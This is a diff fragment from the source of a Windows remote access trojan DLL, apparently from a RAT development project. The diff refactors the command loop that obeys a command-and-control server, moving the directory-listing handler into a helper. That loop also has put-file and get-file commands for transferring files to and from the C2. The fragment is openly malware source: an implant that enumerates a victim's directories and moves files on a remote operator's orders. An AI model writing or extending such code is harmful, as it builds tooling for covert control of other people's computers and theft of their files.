@@ -121,7 +121,6 @@ INT startListen()
                     OutputDebugStringA(msgBuf);
                     goto cleanup;
                 }
-
                 OutputDebugStringA("RAT-Dll::startListen - Successfully performed put file! \n");
             }
 
@@ -135,54 +134,19 @@ INT startListen()
                     OutputDebugStringA(msgBuf);
                     goto cleanup;
                 } 
+                OutputDebugStringA("RAT-Dll-Connect::startListen - Successfully performed get file!\n");
              }
 
             // C2 says to do a dir list for specific directory 
             else if (strcmp((const char*)&recvBuf, DIR) == 0)
              {
-                // Receive our directory path 
-                status = recv(clientSock, recvBuf, recvBufLen, 0);
-                if (status == SOCKET_ERROR)
-                {
-                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failed to recv (dir path) %d\n", WSAGetLastError());
-                    OutputDebugStringA(msgBuf);
-                    continue; // keep trying to do things until we disconnect or receive a cleanup message
-                }
-
-                // Got our directory path 
-                sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Performing dir list on %s...\n", recvBuf);
-                OutputDebugStringA(msgBuf);
-
-                CHAR** dirFiles = NULL;
-                UINT32 numDirFiles = 0;
-
-                status = performDirList(recvBuf, &dirFiles, &numDirFiles);
+                status = handleDirList(clientSock);
                 if (status != SUCCESS)
                 {
-                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure received from performDirList %d\n", status);
+                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure received from handleDirList %d\n", status);
                     OutputDebugStringA(msgBuf);
                     goto cleanup;
                 }
-
-                // Send back each of our files
-                status = sendDirFiles(clientSock, dirFiles, numDirFiles);
-                if (status != SUCCESS)
-                {
-                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure received from sendDirFiles %d\n", status);
-                    OutputDebugStringA(msgBuf);
-                    goto cleanup;
-                }
-
-                // Send back success status code
-                status = send(clientSock, "SUCCESS", 7, 0);
-                if (status == SOCKET_ERROR)
-                {
-                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure recevied from send (status code) %d\n", WSAGetLastError());
-                    OutputDebugStringA(msgBuf);
-                    status = WSAGetLastError();
-                    goto cleanup;
-                }
-
                 OutputDebugStringA("RAT-Dll-Connect::startListen - Successfully performed dir list!\n");
              }
 
